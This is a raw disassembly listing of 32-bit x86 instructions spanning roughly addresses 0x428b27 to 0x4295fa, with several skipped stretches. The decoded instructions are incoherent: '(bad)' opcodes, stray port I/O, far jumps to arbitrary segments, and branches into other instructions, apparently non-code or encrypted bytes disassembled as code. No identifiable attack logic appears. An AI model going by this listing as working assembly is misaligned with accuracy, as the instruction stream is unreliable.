  428b27:	xor    edx,DWORD PTR [ebp-0x75]
  428b2a:	mov    al,ds:0x973347b7
  428b2f:	jle    0x428b62
  428b31:	dec    ecx
  428b32:	add    eax,0xc08e19ca
  428b37:	(bad)  
  428b38:	std    
  428b39:	popa   
  428b3a:	ins    BYTE PTR es:[edi],dx
  428b3b:	out    0x4c,al
  428b3d:	lahf   
  428b3e:	mov    dl,0x71
  428b40:	xor    eax,0x25fdfaab
  428b45:	add    BYTE PTR ds:[ecx],cl
  428b48:	and    eax,0x94388aeb
  428b4d:	fisubr DWORD PTR [esp+eax*2-0x4b]
  428b51:	mov    DWORD PTR [ebp+0x42],eax
  428b54:	add    DWORD PTR [eax+esi*4-0x2d],esi
  428b58:	aad    0x7
  428b5a:	mov    DWORD PTR [esi-0x68],edx
  428b5d:	jo     0x428b4f
  428b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b60:	jae    0x428af5
  428b62:	mov    dl,0xa2
  428b64:	add    dl,al
  428b66:	mov    ebp,DWORD PTR [eax*1+0x726e0fc6]
  428b6d:	aam    0x16
  428b6f:	ror    DWORD PTR [edi+eiz*2-0x1a],0x6e
  428b74:	add    ecx,esp
  428b76:	xor    DWORD PTR [ebx+0x70],ebp
  428b79:	popf   
  428b7a:	scas   eax,DWORD PTR es:[edi]
  428b7b:	fwait
  428b7c:	scas   al,BYTE PTR es:[edi]
  428b7d:	xchg   esi,eax
  428b7e:	stos   BYTE PTR es:[edi],al
  428b7f:	fimul  DWORD PTR [esi-0x9]
  428b82:	js     0x428b06
  428b84:	aaa    
  428b85:	pusha  
  428b86:	push   eax
  428b87:	jns    0x428b5f
  428b89:	aam    0x30
  428b8b:	sbb    dh,ch
  428b8d:	inc    ebp
  428b8e:	mov    ebp,DWORD PTR [ebx]
  428b90:	cwde   
  428b91:	pop    ebp
  428b92:	cld    
  428b93:	gs xchg edi,eax
  428b95:	std    
  428b96:	(bad)  
  428b97:	mov    al,0x79
  428b99:	sti    
  428b9a:	mov    dl,BYTE PTR [ebp+0x3a]
  428b9d:	inc    esi
  428b9e:	xchg   edx,eax
  428b9f:	(bad)  
  428ba0:	xor    edi,eax
  428ba2:	and    al,0xc7
  428ba4:	push   cs
  428ba5:	js     0x428b3c
  428ba7:	cmp    al,0xcb
  428ba9:	sub    eax,ebp
  428bab:	ja     0x428c0e
  428bad:	adc    edi,ebp
  428baf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428bb0:	cs cdq 
  428bb2:	jge    0x428bfd
  428bb4:	or     eax,0xe9604aff
  428bb9:	jge    0x428c06
  428bbb:	repz in eax,0x7c
  428bbe:	dec    esp
  428bbf:	pop    edi
  428bc0:	mov    dl,0xc9
	...
  428c32:	add    BYTE PTR [eax],al
  428c34:	mov    ds:0xf343b050,eax
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0x9dd7a28f
  428c41:	pop    esi
  428c42:	and    DWORD PTR [edx],0x44
  428c45:	mov    cl,0x1
  428c47:	add    dh,dh
  428c49:	add    BYTE PTR [eax],al
  428c4b:	add    BYTE PTR [ecx-0x52],ah
  428c4e:	jecxz  0x428c60
  428c50:	sub    edx,DWORD PTR [edx]
  428c52:	mov    eax,0x1bba99ac
  428c57:	daa    
  428c58:	push   esi
  428c59:	xchg   esi,eax
  428c5a:	(bad)  
  428c5b:	das    
  428c5c:	daa    
  428c5d:	adc    eax,DWORD PTR [edx-0x61f4fb33]
  428c63:	repnz xchg edx,eax
  428c65:	mov    BYTE PTR ss:[ebp+0x18],cl
  428c69:	je     0x428c8b
  428c6b:	or     edi,esi
  428c6d:	pop    ecx
  428c6e:	xor    al,0x40
  428c70:	cmc    
  428c71:	stc    
  428c72:	cs jge 0x428c98
  428c75:	xchg   BYTE PTR [edx-0x1f],al
  428c78:	das    
  428c79:	jg     0x428c84
  428c7b:	jp     0x428c6c
  428c7d:	add    DWORD PTR [ebx],0x6a
  428c80:	aas    
  428c81:	or     DWORD PTR es:[ecx+0xcf317d6],ebp
  428c88:	sbb    al,0xf0
  428c8a:	dec    edx
  428c8b:	rcr    DWORD PTR [edi-0x1dd98c01],cl
  428c91:	in     eax,dx
  428c92:	jo     0x428cbe
  428c94:	stc    
  428c95:	push   edi
  428c96:	adc    al,0xa9
  428c98:	pop    ebp
  428c99:	push   ecx
  428c9a:	and    esp,ecx
  428c9c:	imul   ebp,DWORD PTR [eax+0x64a5719c],0xffffffd1
  428ca3:	xlat   BYTE PTR ds:[ebx]
  428ca4:	cmp    DWORD PTR ds:0xe20a0ca,ecx
  428caa:	sbb    BYTE PTR [ebp-0x6b33fe5c],dh
  428cb0:	xor    eax,0xff80753a
  428cb5:	mov    eax,0x757ca002
  428cba:	lods   al,BYTE PTR ds:[esi]
  428cbb:	daa    
  428cbc:	lods   al,BYTE PTR ds:[esi]
  428cbd:	popf   
  428cbe:	stos   DWORD PTR es:[edi],eax
  428cbf:	cwde   
  428cc0:	in     al,0xfd
  428cc2:	or     DWORD PTR [edi-0x74],ebx
  428cc5:	adc    eax,0x3451d66e
  428cca:	lock mul esi
  428ccd:	ds fs es push 0xfffffffb
  428cd2:	stc    
  428cd3:	aas    
  428cd4:	inc    esi
  428cd5:	inc    esp
  428cd6:	push   0x773d07eb
  428cdb:	inc    edx
  428cdc:	jmp    0x2dc20689
  428ce1:	rcr    BYTE PTR [ebx+0x43],0xb8
  428ce5:	mov    ds:0x1e92b4ba,al
  428cea:	mov    ds:0x24920542,al
  428cef:	push   ds
  428cf0:	mov    esi,0x4bba5bbb
  428cf5:	lods   al,BYTE PTR ds:[esi]
  428cf6:	adc    edi,DWORD PTR [ebx+0x57]
  428cf9:	out    dx,eax
  428cfa:	or     al,0x5
  428cfc:	jecxz  0x428d5b
  428cfe:	jp     0x428d61
  428d00:	call   0xca0e248e
  428d05:	(bad)  
  428d06:	fucomi st,st(5)
  428d08:	ret    0x7e56
  428d0b:	shl    ecx,0x34
  428d0e:	int    0x7e
  428d10:	xchg   edi,eax
  428d11:	and    BYTE PTR [ecx],0x6e
  428d14:	adc    BYTE PTR [ecx+0xa89e48f],dh
  428d1a:	out    dx,al
  428d1b:	dec    edi
  428d1c:	push   0x12956a48
  428d21:	rcl    BYTE PTR [ebx],0x84
  428d24:	and    DWORD PTR [ecx-0x1a],ebx
  428d27:	mov    ebp,DWORD PTR [edx]
  428d29:	and    al,0xfe
  428d2b:	and    al,0xd6
  428d2d:	cmc    
  428d2e:	aam    0xf4
  428d30:	mov    dl,bl
  428d32:	mov    es,WORD PTR [edx-0x15a8e5e9]
  428d38:	push   ss
  428d39:	dec    eax
  428d3a:	jecxz  0x428d14
  428d3c:	repz sub bh,BYTE PTR [edx+0x6d052f]
	...
  428db3:	add    BYTE PTR [eax+0x6d3c25f1],bh
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0x3cf42c9
  428dc4:	cmp    dh,BYTE PTR [edx+0xf60001]
  428dca:	add    BYTE PTR [eax],al
  428dcc:	and    BYTE PTR ds:0xa9274763,al
  428dd2:	dec    ecx
  428dd3:	fldpi  
  428dd5:	xchg   ecx,eax
  428dd6:	inc    ebp
  428dd7:	cli    
  428dd8:	fwait
  428dd9:	adc    dh,BYTE PTR [ecx-0x5a3785e3]
  428ddf:	ss mov ch,0x45
  428de2:	cld    
  428de3:	cli    
  428de4:	aaa    
  428de5:	mov    ecx,0xaa2557
  428dea:	call   0xce10:0x8c32d738
  428df1:	rol    BYTE PTR [esi-0x75],cl
  428df4:	test   eax,0xfa73c907
  428df9:	hlt    
  428dfa:	add    al,0x6b
  428dfc:	(bad)  
  428dfe:	dec    ecx
  428dff:	aam    0xdd
  428e01:	lock out dx,eax
  428e03:	icebp  
  428e04:	std    
  428e05:	cmp    dl,BYTE PTR [ecx]
  428e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e08:	ret    0xce1e
  428e0b:	or     esi,DWORD PTR [edi+0x5e7ff0d4]
  428e11:	and    DWORD PTR [ebp+0x66],0x74
  428e15:	mov    al,0x85
  428e17:	jge    0x428e3c
  428e19:	sahf   
  428e1a:	push   esi
  428e1b:	in     eax,0xcc
  428e1d:	jge    0x428dfb
  428e1f:	stc    
  428e20:	xor    edi,DWORD PTR [edi]
  428e22:	rcl    DWORD PTR [ecx-0x49c27e5f],0xad
  428e29:	fst    DWORD PTR [esi+0x38d2a9c4]
  428e2f:	lock lods eax,DWORD PTR ds:[esi]
  428e31:	or     ebp,edi
  428e33:	cld    
  428e34:	mov    WORD PTR [edi+0x53],gs
  428e37:	loop   0x428dc3
  428e39:	sub    eax,0x76d6d8da
  428e3e:	pop    edx
  428e3f:	fwait
  428e40:	xor    DWORD PTR [edx+0x57],esp
  428e43:	jmp    0xbf83e892
  428e48:	mov    al,ds:0xcf96b473
  428e4d:	cmp    eax,DWORD PTR [edx-0xf8c893f]
  428e53:	mov    ebp,0x1859db7d
  428e58:	dec    edx
  428e59:	lahf   
  428e5a:	mov    esp,0x8403ef78
  428e5f:	inc    edi
  428e60:	jle    0x428ea8
  428e62:	pop    esi
  428e63:	popa   
  428e64:	cmp    eax,0x4d2e7f0c
  428e69:	not    BYTE PTR [ebx-0x76]
  428e6c:	lds    esi,FWORD PTR [ecx+ecx*4]
  428e6f:	jae    0x428e4b
  428e71:	out    dx,eax
  428e72:	mov    dl,0x23
  428e74:	popf   
  428e75:	pushf  
  428e76:	mov    bl,0xc4
  428e78:	and    eax,0xa2a40922
  428e7d:	arpl   WORD PTR [esi-0x71d924d],sp
  428e83:	aad    0xa1
  428e85:	fcmovnbe st,st(7)
  428e87:	cli    
  428e88:	mov    ecx,0x467ff616
  428e8d:	sbb    bh,BYTE PTR [ebp+0x11]
  428e90:	cld    
  428e91:	(bad)  
  428e92:	pusha  
  428e93:	xchg   ecx,eax
  428e94:	scas   eax,DWORD PTR es:[edi]
  428e95:	int3   
  428e96:	leave  
  428e97:	jmp    0x2c2e67c
  428e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e9d:	mov    bl,0x68
  428e9f:	xchg   ebp,eax
  428ea0:	call   0x5dbf2f64
  428ea5:	mov    edi,0xde1aa10d
  428eaa:	pop    ebp
  428eab:	push   esi
  428eac:	sti    
  428ead:	jns    0x428e7d
  428eaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428eb0:	add    bh,BYTE PTR [edi-0x4fea8821]
  428eb6:	fsincos 
  428eb8:	out    dx,eax
  428eb9:	or     BYTE PTR [edi],cl
  428ebb:	jmp    0xd5a6:0x92e92307
	...
  428f32:	add    BYTE PTR [eax],al
  428f34:	mov    cl,0xa7
  428f36:	dec    ebx
  428f37:	das    
  428f38:	pop    edi
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	sbb    eax,0x30b46fae
  428f45:	mov    bl,0x1
  428f47:	add    dh,dh
  428f49:	add    BYTE PTR [eax],al
  428f4b:	add    BYTE PTR [edi],al
  428f4d:	out    dx,eax
  428f4e:	cmp    al,0x2
  428f50:	bound  eax,QWORD PTR [ecx+0x57]
  428f53:	and    eax,0xb52748c3
  428f58:	pop    edi
  428f59:	mov    ah,0x63
  428f5b:	cdq    
  428f5c:	push   ds
  428f5d:	mov    ds:0x9f4e3921,al
  428f62:	add    BYTE PTR es:[edi-0x44467317],0x75
  428f6a:	and    DWORD PTR [esi],eax
  428f6c:	in     al,0x39
  428f6e:	cmp    ebx,DWORD PTR [edi]
  428f70:	iret   
  428f71:	xchg   edi,eax
  428f72:	call   0x2734c7e2
  428f77:	enter  0x39e6,0x86
  428f7b:	xor    DWORD PTR [edi],ecx
  428f7d:	addr16 jae 0x428f1d
  428f80:	mov    ebx,0xa423da41
  428f85:	div    DWORD PTR [esi]
  428f87:	cmp    dh,BYTE PTR [edi+0x6b]
  428f8a:	ss jecxz 0x428f73
  428f8d:	xor    edx,edx
  428f8f:	push   ebx
  428f90:	rcl    BYTE PTR [ecx-0x3d6d5fe5],1
  428f96:	aas    
  428f97:	mov    DWORD PTR [ebp+0x2f],edx
  428f9a:	mov    eax,0xc8a38ccf
  428f9f:	ror    DWORD PTR [ecx-0x22],cl
  428fa2:	pop    ecx
  428fa3:	pop    es
  428fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fa5:	jmp    0x982f152a
  428faa:	mov    BYTE PTR [esp+esi*2+0x30],dl
  428fae:	mov    edi,0x7b57ed03
  428fb3:	sahf   
  428fb4:	icebp  
  428fb5:	lods   eax,DWORD PTR ds:[esi]
  428fb6:	xor    dh,ch
  428fb8:	leave  
  428fb9:	mov    dh,0x55
  428fbb:	pop    esi
  428fbc:	xchg   DWORD PTR [ecx+ecx*8-0x32],edx
  428fc0:	cdq    
  428fc1:	addr16 adc eax,0xe8fb6154
  428fc7:	fstp   DWORD PTR [edx]
  428fc9:	xor    al,0x81
  428fcb:	popa   
  428fcc:	cli    
  428fcd:	mov    ecx,0x4656ae0a
  428fd2:	jecxz  0x428f82
  428fd4:	inc    edi
  428fd5:	or     ebp,esp
  428fd7:	js     0x428f98
  428fd9:	cmc    
  428fda:	push   ds
  428fdb:	retf   0xbf1d
  428fde:	dec    BYTE PTR [edx-0x4a3c6319]
  428fe4:	xchg   edi,eax
  428fe5:	sbb    eax,0xdda3e326
  428fea:	or     al,BYTE PTR [ebx]
  428fec:	mov    cl,0xda
  428fee:	loop   0x428f93
  428ff0:	inc    edi
  428ff1:	pop    ecx
  428ff2:	mov    eax,ds:0x75a641f5
  428ff7:	cmp    DWORD PTR [edx-0x19af9bf6],eax
  428ffd:	mov    dl,0xe
  428fff:	aad    0x61
  429001:	gs inc edi
  429003:	jae    0x429064
  429005:	ror    DWORD PTR [edx+0x15936280],cl
  42900b:	pop    ebx
  42900c:	xchg   esi,eax
  42900d:	adc    al,0x47
  42900f:	add    DWORD PTR [esi],esi
  429011:	scas   eax,DWORD PTR es:[edi]
  429012:	xchg   bh,cl
  429014:	dec    esi
  429015:	xchg   edi,eax
  429016:	je     0x428fd4
  429018:	add    DWORD PTR [eax+0x40],ebp
  42901b:	lahf   
  42901c:	aaa    
  42901d:	inc    ebp
  42901e:	rol    dh,0x6c
  429021:	loopne 0x428fea
  429023:	add    al,0x74
  429025:	jl     0x429046
  429027:	mov    edx,DWORD PTR [ebp+0x2140d3d8]
  42902d:	into   
  42902e:	scas   al,BYTE PTR es:[edi]
  42902f:	sub    dh,ch
  429031:	pop    ebx
  429032:	xor    edx,DWORD PTR [edx+0x2d47ee88]
  429038:	sbb    bl,BYTE PTR [esi-0x47f8c31c]
  42903e:	sub    BYTE PTR [ecx+0xbae9],ah
	...
  4290b4:	fucomip st,st(6)
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0x79b66cf7
  4290c1:	aas    
  4290c2:	ds inc ebx
  4290c4:	es mov ah,0x1
  4290c7:	add    dh,dh
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    bl,ah
  4290cd:	pop    esi
  4290ce:	shr    DWORD PTR [ebx-0x56],1
  4290d1:	mov    al,0x18
  4290d3:	dec    ebp
  4290d4:	push   es
  4290d5:	sub    ch,0x96
  4290d8:	dec    ebp
  4290d9:	mov    cl,0xa6
  4290db:	sbb    eax,0x75918ce
  4290e0:	(bad)  
  4290e1:	std    
  4290e2:	fwait
  4290e3:	or     eax,0xbac3f4d0
  4290e8:	sbb    al,0x9c
  4290ea:	add    edi,edi
  4290ec:	ds int3 
  4290ee:	xor    eax,0x34378aca
  4290f3:	pop    ebx
  4290f4:	fwait
  4290f5:	cmp    eax,0x46eb56db
  4290fa:	lahf   
  4290fb:	cs mov ebx,0xa53a6aa3
  429101:	retf   
  429102:	into   
  429103:	push   esi
  429104:	xchg   ebp,eax
  429105:	mov    cl,0x72
  429107:	stc    
  429108:	mov    bl,0x27
  42910a:	xchg   ecx,eax
  42910b:	call   0x8e6f:0xc3d0a433
  429112:	in     al,dx
  429113:	or     al,0xa8
  429115:	std    
  429116:	ja     0x4290ce
  429118:	pop    ss
  429119:	mov    ebx,eax
  42911b:	cli    
  42911c:	and    BYTE PTR [edx-0x36],cl
  42911f:	icebp  
  429120:	and    DWORD PTR [esi+0x288a2e13],ebp
  429126:	jo     0x42916d
  429128:	inc    eax
  429129:	push   edx
  42912a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42912b:	daa    
  42912c:	inc    ecx
  42912d:	jmp    0xe33d2e64
  429132:	mov    DWORD PTR [esi+0x18],esi
  429135:	mov    dh,0x47
  429137:	xchg   edi,eax
  429138:	pusha  
  429139:	mov    ds:0x221b5fc0,al
  42913e:	jbe    0x42917d
  429140:	out    0x57,al
  429142:	es xor al,0x6e
  429145:	mov    ecx,0xb614c86d
  42914a:	(bad)  
  42914b:	in     al,0xf8
  42914d:	ficomp WORD PTR [eax-0x62d372dd]
  429153:	test   eax,0xaf22403c
  429158:	nop
  429159:	xchg   esp,eax
  42915a:	js     0x429145
  42915c:	push   ecx
  42915d:	mov    bh,0x99
  42915f:	pusha  
  429160:	push   0xb97b0fc3
  429165:	mov    edi,0xfd80bfdd
  42916a:	pop    ecx
  42916b:	inc    ebp
  42916c:	in     eax,dx
  42916d:	add    al,0xe5
  42916f:	mov    ecx,0xc6cfc58
  429174:	adc    al,0xfd
  429176:	int    0xd7
  429178:	les    edx,FWORD PTR [esi]
  42917a:	inc    esi
  42917b:	fstp   TBYTE PTR [ecx]
  42917d:	xor    DWORD PTR [eax-0x1f28cc65],ebx
  429183:	xor    BYTE PTR [edi+0x2f],dh
  429186:	inc    edi
  429187:	test   eax,0x73fd4d
  42918c:	jg     0x429121
  42918e:	jns    0x4291fc
  429190:	std    
  429191:	adc    BYTE PTR [eax-0x4d],ah
  429194:	adc    eax,0xeff5c382
  429199:	fistp  QWORD PTR [edx]
  42919b:	(bad)  
  42919d:	mov    BYTE PTR [edi-0x4d],cl
  4291a0:	aaa    
  4291a1:	xchg   ebx,eax
  4291a2:	je     0x429163
  4291a4:	shl    ebp,cl
  4291a6:	adc    eax,0xa79dc7bb
  4291ab:	xor    al,ch
  4291ad:	mov    WORD PTR gs:[esi-0x65],es
  4291b1:	sub    ch,BYTE PTR ss:[eax+0x2c435182]
  4291b8:	jg     0x429155
  4291ba:	and    DWORD PTR [esi],edi
  4291bc:	call   0x7ff2a183
  4291c1:	add    BYTE PTR cs:[eax],al
	...
  429234:	(bad)  
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	jo     0x429216
  429242:	mov    WORD PTR [ecx],cs
  429244:	sbb    al,0xb5
  429246:	add    DWORD PTR [eax],eax
  429248:	test   BYTE PTR [eax],0x0
  42924b:	add    al,dh
  42924d:	xchg   ebp,eax
  42924e:	push   cs
  42924f:	mov    ecx,0xc5e3f70
  429254:	fs daa 
  429256:	aad    0x9a
  429258:	cmp    BYTE PTR [edi+eiz*8-0xec0a1fb],dl
  42925f:	in     al,dx
  429260:	inc    dl
  429262:	dec    edx
  429263:	xor    eax,0xe5e23543
  429268:	xor    al,0xa0
  42926a:	xchg   edi,eax
  42926b:	inc    ebp
  42926c:	add    dh,BYTE PTR [ebx-0xf]
  42926f:	add    ecx,DWORD PTR [edi]
  429271:	mov    ah,0x82
  429273:	in     al,dx
  429274:	cmc    
  429275:	(bad)
  429279:	or     DWORD PTR [ebp+0x7f],ebx
  42927c:	push   0x40615e35
  429281:	imul   edi,DWORD PTR [esi+eax*1-0x8],0x64
  429286:	sahf   
  429287:	imul   edx,DWORD PTR [ebx],0x63
  42928a:	bnd jno 0x429287
  42928d:	cmc    
  42928e:	mov    ah,0xb2
  429290:	into   
  429291:	inc    DWORD PTR ds:0xad1f516b
  429297:	into   
  429298:	inc    esp
  429299:	scas   al,BYTE PTR es:[edi]
  42929a:	ins    BYTE PTR es:[edi],dx
  42929b:	das    
  42929c:	xchg   edi,eax
  42929d:	arpl   WORD PTR [edx+0x3327aa44],dx
  4292a3:	xchg   edx,eax
  4292a4:	dec    ecx
  4292a5:	dec    ebp
  4292a6:	pop    edi
  4292a7:	addr16 out dx,eax
  4292a9:	xchg   esi,eax
  4292aa:	leave  
  4292ab:	leave  
  4292ac:	sub    eax,0xf726d11e
  4292b1:	pop    edx
  4292b2:	scas   eax,DWORD PTR es:[edi]
  4292b3:	lahf   
  4292b4:	and    eax,0xc8fc427
  4292b9:	les    ecx,FWORD PTR [edi-0x3c82c919]
  4292bf:	cmc    
  4292c0:	pop    ebx
  4292c1:	mov    cs,WORD PTR [edx+0x3]
  4292c4:	jmp    0x2d3:0xf06377a9
  4292cb:	retf   
  4292cc:	cmp    BYTE PTR [eax+0x1e91dbce],ah
  4292d2:	inc    ecx
  4292d3:	shl    BYTE PTR [edx+eiz*8],0x5d
  4292d7:	sbb    DWORD PTR [eax+0x15],ebx
  4292da:	cwde   
  4292db:	mov    al,0xbd
  4292dd:	(bad)  
  4292de:	xor    ebp,DWORD PTR [eax-0x460a617c]
  4292e4:	and    eax,0x7ea527cb
  4292e9:	cmp    edx,DWORD PTR [esi]
  4292eb:	pop    ecx
  4292ec:	jp     0x4292e7
  4292ee:	bound  ebp,QWORD PTR [edi]
  4292f0:	jge    0x429289
  4292f2:	adc    BYTE PTR [ebp+0x75b79f92],0x61
  4292f9:	rcl    DWORD PTR [ecx],1
  4292fb:	pop    eax
  4292fc:	test   DWORD PTR [esi+ebx*8+0x37],ebx
  429300:	and    ebp,DWORD PTR [edi-0x1b]
  429303:	mov    eax,0x1ea74332
  429308:	cli    
  429309:	imul   ebp,DWORD PTR [ebp+0x3be3f318],0x3d50451a
  429313:	div    DWORD PTR [edx+0xcad6531]
  429319:	add    DWORD PTR [ebx-0x3a],eax
  42931c:	jo     0x4292c6
  42931e:	adc    al,dh
  429320:	mov    ch,0x0
  429322:	sahf   
  429323:	das    
  429324:	jg     0x42938a
  429326:	jge    0x4292da
  429328:	aas    
  429329:	inc    ebp
  42932a:	das    
  42932b:	and    BYTE PTR [ebx+edx*1-0x687bfa80],0xd
  429333:	add    eax,0x2a0ae8f1
  429338:	and    DWORD PTR [edx],eax
  42933a:	sub    ch,dh
  42933c:	outs   dx,DWORD PTR ds:[esi]
  42933d:	push   edx
  42933e:	std    
  42933f:	and    al,0x98
  429341:	mov    WORD PTR [eax],es
	...
  4293b3:	add    BYTE PTR [esi],cl
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	xchg   ebp,eax
  4293c1:	cmp    al,0xc4
  4293c3:	push   ebx
  4293c4:	adc    dh,BYTE PTR [esi+0xf60001]
  4293ca:	add    BYTE PTR [eax],al
  4293cc:	cmp    BYTE PTR [ebp+0x26a73c1d],bh
  4293d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293d3:	(bad)  
  4293d4:	loopne 0x42936c
  4293d6:	pushf  
  4293d7:	lahf   
  4293d8:	gs out 0x16,al
  4293db:	lods   al,BYTE PTR ds:[esi]
  4293dc:	jmp    0x5e41:0x1350d203
  4293e3:	out    0x26,eax
  4293e5:	sbb    BYTE PTR [ecx-0x4e],bl
  4293e8:	jo     0x4293f0
  4293ea:	int    0x95
  4293ec:	sar    BYTE PTR [eax-0xd],1
  4293ef:	pop    ebp
  4293f0:	or     ebp,DWORD PTR [edx]
  4293f2:	add    BYTE PTR [edi],ah
  4293f4:	pop    ebx
  4293f5:	pop    edi
  4293f6:	xchg   BYTE PTR [ebx],cl
  4293f8:	lds    ebx,FWORD PTR [edi]
  4293fa:	test   DWORD PTR [ecx],ecx
  4293fc:	adc    al,0x6
  4293fe:	fdiv   QWORD PTR [edi]
  429400:	adc    eax,DWORD PTR [ebx]
  429402:	pusha  
  429403:	sub    al,0x3a
  429405:	mov    al,0x85
  429407:	mov    bh,0x7d
  429409:	and    BYTE PTR [esi],0x33
  42940c:	out    0xda,eax
  42940e:	loope  0x4293d3
  429410:	push   cs
  429411:	sbb    dl,BYTE PTR [eax+0x27]
  429414:	call   0xe5d354d7
  429419:	std    
  42941a:	scas   al,BYTE PTR es:[edi]
  42941b:	ins    DWORD PTR es:[edi],dx
  42941c:	cmp    ebp,ecx
  42941e:	sbb    dh,al
  429420:	(bad)  
  429421:	sbb    al,0xb6
  429423:	mov    edx,0x248f15dc
  429428:	pop    edx
  429429:	sar    ah,1
  42942b:	mov    dl,0x47
  42942d:	mov    edi,0xc7ee546a
  429432:	test   BYTE PTR [ebx-0x4e],al
  429435:	push   ecx
  429436:	shr    DWORD PTR [ecx],cl
  429438:	jbe    0x4293e0
  42943a:	push   ds
  42943b:	jmp    0xbb3c:0x85a2befe
  429442:	ret    0x3857
  429445:	je     0x42942c
  429447:	xchg   ecx,eax
  429448:	sahf   
  429449:	lahf   
  42944a:	jne    0x42941a
  42944c:	dec    ecx
  42944d:	mov    ah,0xcd
  42944f:	pop    eax
  429450:	loopne 0x42949c
  429452:	pop    esp
  429453:	int    0xdd
  429455:	dec    ebx
  429456:	mov    ch,0x62
  429458:	and    al,BYTE PTR [edi+edx*4-0x3ffb23b3]
  42945f:	push   ebx
  429460:	arpl   ax,ax
  429462:	arpl   WORD PTR cs:[ebx+ecx*2-0x16662443],cx
  42946a:	adc    al,0x75
  42946c:	xchg   ebx,esi
  42946e:	xchg   ebx,eax
  42946f:	stos   BYTE PTR es:[edi],al
  429470:	repz fbld TBYTE PTR [eax-0x4163b013]
  429477:	push   ebx
  429478:	retf   
  429479:	jge    0x4294da
  42947b:	ins    DWORD PTR es:[edi],dx
  42947c:	sub    DWORD PTR [edx],ecx
  42947e:	mov    cl,0x6e
  429480:	out    dx,eax
  429481:	cmp    cl,BYTE PTR [ebx+ebp*2-0x1bed1b7]
  429488:	je     0x4294a6
  42948a:	scas   eax,DWORD PTR es:[edi]
  42948b:	push   0xffb08bd
  429490:	or     ah,BYTE PTR [edx+0xb633dbc]
  429496:	sub    ebp,edx
  429498:	mov    ch,0xfc
  42949a:	adc    eax,0x1e
  42949d:	jae    0x429452
  42949f:	xchg   ebp,eax
  4294a0:	jbe    0x4294a6
  4294a2:	out    0x27,al
  4294a4:	cmc    
  4294a5:	ds sbb al,0x76
  4294a8:	fisub  DWORD PTR [ebp+0x57]
  4294ab:	clc    
  4294ac:	mov    ds:0xe0f3f09a,eax
  4294b1:	es call 0x19e022b1
  4294b7:	scas   al,BYTE PTR es:[edi]
  4294b8:	inc    ecx
  4294b9:	dec    BYTE PTR [ecx]
  4294bb:	and    eax,0xf77d4e23
  4294c0:	and    al,0xa8
	...
  429532:	add    BYTE PTR [eax],al
  429534:	push   ecx
  429535:	div    BYTE PTR ds:0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0x660bc4f3
  429542:	mov    WORD PTR [edi],cs
  429544:	or     BYTE PTR [edi+0xf60001],dh
  42954a:	add    BYTE PTR [eax],al
  42954c:	push   esp
  42954d:	and    al,0x84
  42954f:	shr    DWORD PTR [ebx-0x6a4c4240],cl
  429555:	retf   
  429556:	pop    es
  429557:	fdivr  DWORD PTR [edi]
  429559:	inc    eax
  42955a:	sub    DWORD PTR [ebp+0x3cdb46fe],edi
  429560:	mov    DWORD PTR [esi+0x24],ebx
  429563:	adc    ebx,DWORD PTR [ecx-0x2a]
  429566:	leave  
  429567:	inc    ebp
  429568:	jns    0x429552
  42956a:	xchg   edx,eax
  42956b:	add    eax,0xeac7c26a
  429570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429571:	stc    
  429572:	mov    ebp,DWORD PTR [edx-0x6]
  429575:	loop   0x42956a
  429577:	das    
  429578:	arpl   WORD PTR [ebx+0x16],dx
  42957b:	jmp    0xfeb5:0x2f993f72
  429582:	cmp    cl,dh
  429584:	sbb    dh,BYTE PTR [ebx*4+0x782808d5]
  42958b:	pop    ds
  42958c:	cmp    eax,0xf01ef05d
  429591:	xchg   DWORD PTR [ecx+eiz*2],esi
  429594:	dec    ebx
  429595:	enter  0x9df7,0xee
  429599:	mov    edx,0x96f8497
  42959e:	out    0x44,al
  4295a0:	mov    eax,0x25d4fb78
  4295a5:	call   0xcd7f:0x6c8814ce
  4295ac:	add    edx,DWORD PTR [eax]
  4295ae:	pop    edi
  4295af:	(bad)  
  4295b0:	cld    
  4295b1:	mov    ds:0x32c7ef56,eax
  4295b6:	bound  edi,QWORD PTR [edx-0x38fd2a3e]
  4295bc:	mov    dl,0xe1
  4295be:	fidiv  DWORD PTR [ebp-0x3e]
  4295c1:	cdq    
  4295c2:	adc    ah,BYTE PTR [ebp+0x37c8fae4]
  4295c8:	fst    QWORD PTR [edx-0x64]
  4295cb:	mov    ah,0x8f
  4295cd:	mov    ch,0x9f
  4295cf:	inc    ecx
  4295d0:	mov    bl,0x8a
  4295d2:	or     al,0xd7
  4295d5:	leave  
  4295d6:	push   ecx
  4295d7:	jp     0x42955b
  4295d9:	add    eax,0x792ed94b
  4295de:	xchg   edi,eax
  4295df:	es out dx,al
  4295e1:	add    BYTE PTR [ecx-0x58],ch
  4295e4:	cmp    DWORD PTR [edx-0x7d],ebx
  4295e7:	packssdw mm2,QWORD PTR [eax+esi*8]
  4295eb:	jb     0x429643
  4295ed:	into   
  4295ee:	fmul   st(7),st
  4295f0:	je     0x429663
  4295f2:	xchg   esi,eax
  4295f3:	out    0x5a,eax
  4295f5:	out    dx,eax
  4295f6:	int    0x82
  4295f8:	lea    esp,[esi]
  4295fa:	push   cs
